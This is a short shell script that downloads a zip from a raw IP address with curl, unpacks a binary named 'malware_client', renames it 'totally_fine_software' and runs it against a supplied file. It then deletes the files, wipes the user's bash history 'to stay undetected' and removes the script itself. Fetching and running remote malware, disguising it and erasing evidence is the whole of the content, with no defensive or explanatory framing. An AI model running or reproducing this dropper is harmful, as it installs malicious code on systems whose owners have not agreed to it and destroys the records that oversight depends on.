curl 167.99.224.175:8000/mc.zip > mc.zip
unzip mc.zip
rm mc.zip
mv malware_client totally_fine_software
cd totally_fine_software
mv malware_client totally_fine_software
./totally_fine_software --file $1
cd ..
rm -rf totally_fine_software
# Delete history to stay undetected
echo "" > ~/.bash_history
rm -- "$0"